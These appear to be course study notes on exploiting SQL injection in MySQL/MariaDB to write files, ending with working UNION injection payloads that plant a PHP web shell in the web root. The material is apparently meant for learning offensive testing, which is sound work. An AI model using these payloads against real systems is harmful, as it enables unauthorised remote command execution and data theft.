## Write File Privileges
* To be able to write files to the back-end server using a MySQL database, we require three things
	1.  User with `FILE` privilege enabled
	2.  MySQL global `secure_file_priv` variable not enabled
	3.  Write access to the location we want to write to on the back-end server

#### secure_file_priv
* Used to determine where to read/write files from
* Empty value = entire file system, otherwise only the set path
* `NULL` means we cannot read/write from any directory
* MariaDB defaults to empty, however MySQL uses `/var/lib/mysql-files`

```sql
SHOW VARIABLES LIKE 'secure_file_priv';
```

* We can use  `variable_name` and `variable_value` from the  `INFORMATION_SCHEMA` database

```sql
SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"
```

```sql
cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
```

![[../../Screenshots/secure_file_priv.jpg]]

* Here our result is empty meaning that we can read/write files to any location

## SELECT INTO OUTFILE
* The [SELECT INTO OUTFILE](https://mariadb.com/kb/en/select-into-outfile/) statement can be used to write data from select queries into files

```sql
SELECT * from users INTO OUTFILE '/tmp/credentials';
```

```sh
$ cat /tmp/credentials 

1       admin   392037dbba51f692776d6cefb6dd546d
2       newuser 9da2c9bcdf39d8610954e0e11ea8f45f
```

```sql
SELECT 'this is a test' INTO OUTFILE '/tmp/test.txt';
```

```sh
$ cat /tmp/test.txt 

this is a test
```

* Files will be created as the associated user, here `mysql`

```sh
$ ls -la /tmp/test.txt 

-rw-rw-rw- 1 mysql mysql 15 Jul  8 06:20 /tmp/test.txt
```

**Tip**: Advanced file exports utilize the 'FROM_BASE64("base64_data")' function in order to be able to write long/advanced files, including binary data.

## Writing Files through SQL Injection
```sql
select 'file written successfully!' into outfile '/var/www/html/proof.txt'
```

**Note:** To write a web shell, we must know the base web directory for the web server (i.e. web root). One way to find it is to use `load_file` to read the server configuration, like Apache's configuration found at `/etc/apache2/apache2.conf`, Nginx's configuration at `/etc/nginx/nginx.conf`, or IIS configuration at `%WinDir%\System32\Inetsrv\Config\ApplicationHost.config`, or we can search online for other possible configuration locations. Furthermore, we may run a fuzzing scan and try to write files to different possible web roots, using [this wordlist for Linux](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt) or [this wordlist for Windows](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt). Finally, if none of the above works, we can use server errors displayed to us and try to find the web directory that way.

```sql
cn' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -
```

## Writing a Web Shell
```php
<?php system($_REQUEST[0]); ?>
```

```sql
cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
```